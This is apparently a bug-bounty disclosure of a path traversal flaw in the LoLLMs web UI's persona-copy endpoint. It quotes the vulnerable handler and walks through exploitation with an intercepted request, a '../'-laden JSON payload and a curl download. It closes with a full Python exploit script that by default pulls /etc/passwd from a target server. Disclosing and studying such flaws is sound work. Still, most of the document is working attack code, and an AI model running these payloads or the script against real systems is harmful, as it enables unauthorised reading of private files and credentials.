# Local File Read (LFI) when "Copy to custom personas folder for editing"

# Description

`LoLLMs` allow users to use `personalities` for LLM's role and prompts and etc. these `personalities` is fetch from the official repo when first downloading.

Furthermore, `LoLLMs` allow users to duplicate a `personality` to `custom_personalities`. However, the `category` variable and `name` variable is extremely unsafe, attacker can install `Path traversal payload` like `../../../../../` instead the normal `<category>` and `<name>`

 # Proof of Concept

### `/lollms-webui/lollms_core/lollms/server/endpoints/lollms_personalities_infos.py`

```python
@router.post("/copy_to_custom_personas")
async def copy_to_custom_personas(data: PersonalityInfos):
    """
    Copies the personality to custom personas so that you can modify it.

    """
    import shutil
    category = data.category
    name = data.name

    if category=="custom_personalities":
        lollmsElfServer.InfoMessage("This persona is already in custom personalities folder")
        return {"status":False}
    else:
        personality_folder = lollmsElfServer.lollms_paths.personalities_zoo_path/f"{category}"/f"{name}"
        destination_folder = lollmsElfServer.lollms_paths.custom_personalities_path
        shutil.copytree(personality_folder, destination_folder/f"{name}")
        return {"status":True}
```

This endpoint is called when user is `Copy to custom personas folder for editing`. It first retrieved the `category` and `name` parameter in the request and saved them to a variable.

However, this function failed to consider when `category` or `name` parameter is an path instead the **model name**, and use `sanitize_path_from_endpoint`, in consequence, the server will parse directly the `category` and `name` in to the `personality_folder` even when it included `../../`.

## Exploiting

1. Go to `http://localhost:9600/settings/`

2. Select arbitrary personality in `Personalities Zoos`

3. In you selected personality, click the menu and use `to custom personas folder for editing` 

4. Use proxy tools such as `burpsuite` to intercept the request

   

   You may see this (for example I an selecting `cyber_security/cyber_sentinel`):

   ```yaml
   POST /copy_to_custom_personas HTTP/1.1
   Host: localhost:9600
   Content-Length: 53
   sec-ch-ua: 
   Accept: application/json, text/plain, */*
   Content-Type: application/json
   sec-ch-ua-mobile: ?0
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
   sec-ch-ua-platform: ""
   Origin: http://localhost:9600
   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: cors
   Sec-Fetch-Dest: empty
   Referer: http://localhost:9600/settings/
   Accept-Encoding: gzip, deflate
   Accept-Language: zh-CN,zh;q=0.9
   Connection: close
   
   {"category":"cyber_security","name":"cyber_sentinel"}
   ```

   Now edit the payload in to 

   ```yaml
   {"category":"../../../../../../../../../../<ANY_ABSOLUTE_PATH>","name":"<THE_STEM_OF_THE_PATH>"}
   # name must not be null, or it may return InfoMessage("This persona is already in custom personalities folder")
   ```

   For example

   ```yaml
   {"category":"../../../../../../../../../../home/retr0/PoC/","name":"sensitive"}
   ```

5. Now you can download the files in the directory.

   For example:

   ```shell
   curl -X 'GET' \
   'http://localhost:9600/personalities/custom_personalities%2Fsensitive%2Fmy_private_passwd' \
     -H 'accept: application/json'
   ```

   result:

   ```
   my_private_passwd
   ```


## PoC.py

```python
import json
import requests
import argparse
import requests

TARGET = "http://localhost:9600"

def parse_args():
    # get path travalTo
    parser = argparse.ArgumentParser(description="Exploit for the https://huntr.com/bounties/e585f1dd-a026-4419-8f42-5835e85fad9e/\n")
    parser.add_argument("--path", type=str, default="/etc/passwd", help="Targeted file abosulte path")
    # parser.add_argument("--base", type=str, default="uploads", help="downloaded base (For example: uploads)")
    return parser.parse_args()

def parse_path(path: str):
    # e.g: /etc/passwd
    # return /etc/ and passwd as tuple
    filename = path.split("/")[-1]
    ppath = "/".join(path.split("/")[:-1])
    return ppath.rsplit("/", 1), filename

def exploit(
        path: tuple = ("/", "etc"),
    ):

    print(f"\n\n[+] Exploiting {TARGET} with path {path[0]} and stem {path[1]}")


    payload = {
        "category":'../'*(10-1) + '..' + path[0],
        "name":path[1],
    }

    print(f"    [+] Payload: {payload}")

    # Content-Type: application/json
    req = requests.post(
        f"{TARGET}/copy_to_custom_personas",
        data=json.dumps(payload),
        headers={"Content-Type": "application/json"}
    )

    print(f"    [+] Response: {req.text}")

    return path[0],path[1]

def download_file(
        path: tuple = ("/", "etc"),
        filename: str = "passwd",
    ):

    global TARGET
    base = "custom_personalities"

    print(f"\n\n[+] Downloading file {filename} from {TARGET}/personalities/{base}/{path[1]}/{filename}")
    return requests.get(f"{TARGET}/personalities/{base}/{path[1]}/{filename}").text


def main():


    args = parse_args()
    path,file = parse_path(args.path)

    print(f"{path=}, {file=}")

    if input(f"[+] This exploit will download the whole {path[0]}/{path[1]}, You sure to continue? [Y/n]: ").lower() != "y":
        print("[-] Exiting...")
        return 

    exploit(path)
    fetched_file = download_file(path,file)

    print(f"[+] File content: \n{fetched_file}")
    

main()
```

